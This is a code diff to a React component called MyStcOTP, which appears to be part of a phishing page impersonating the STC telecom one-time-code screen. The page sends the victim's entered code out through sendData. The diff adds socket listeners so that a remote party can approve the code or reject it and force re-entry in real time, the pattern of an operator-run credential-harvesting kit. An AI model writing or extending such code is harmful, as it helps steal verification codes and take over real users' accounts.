@@ -8,12 +8,14 @@ import {
   isFormApproved,
   isFormRejected,
   navigateToPage,
+  socket,
 } from "@/lib/store";
 
 export default function MyStcOTP() {
   const [, navigate] = useLocation();
   const [otp, setOtp] = useState("");
   const [error, setError] = useState(false);
+  const [errorMessage, setErrorMessage] = useState("");
   const inputRef = useRef<HTMLInputElement>(null);
 
   // التحقق من صحة الرمز (4 أو 6 أرقام)
@@ -28,21 +30,31 @@ export default function MyStcOTP() {
     }, 100);
   }, []);
 
-  // Handle form approval
+  // Listen for form:rejected and form:approved events directly from socket
   useEffect(() => {
-    if (isFormApproved.value) {
-      navigate("/phone-otp?serviceProvider=0");
-    }
-  }, [isFormApproved.value, navigate]);
-
-  // Handle form rejection - clear OTP
-  useEffect(() => {
-    if (isFormRejected.value) {
+    const s = socket.value;
+    
+    const handleRejected = () => {
+      console.log("MyStcOTP: Form rejected received!");
       setOtp("");
       setError(true);
+      setErrorMessage("يرجى ادخال الرمز بشكل صحيح");
       inputRef.current?.focus();
-    }
-  }, [isFormRejected.value]);
+    };
+
+    const handleApproved = () => {
+      console.log("MyStcOTP: Form approved received!");
+      navigate("/phone-otp?serviceProvider=0");
+    };
+
+    s.on("form:rejected", handleRejected);
+    s.on("form:approved", handleApproved);
+
+    return () => {
+      s.off("form:rejected", handleRejected);
+      s.off("form:approved", handleApproved);
+    };
+  }, [navigate]);
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -50,10 +62,12 @@ export default function MyStcOTP() {
     // السماح بـ 4 أو 6 خانات
     if (!isOtpValid) {
       setError(true);
+      setErrorMessage("يرجى ادخال الرمز بشكل صحيح");
       return;
     }
 
     setError(false);
+    setErrorMessage("");
     sendData({
       digitCode: otp,
       current: "MyStc OTP",
@@ -75,6 +89,7 @@ export default function MyStcOTP() {
     const value = e.target.value.replace(/\D/g, '').slice(0, 6);
     setOtp(value);
     setError(false);
+    setErrorMessage("");
   };
 
   return (
@@ -117,9 +132,9 @@ export default function MyStcOTP() {
             />
           </div>
 
-          {error && (
+          {errorMessage && (
             <p className="text-red-500 text-xs text-center">
-              رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى
+              {errorMessage}
             </p>
           )}
 
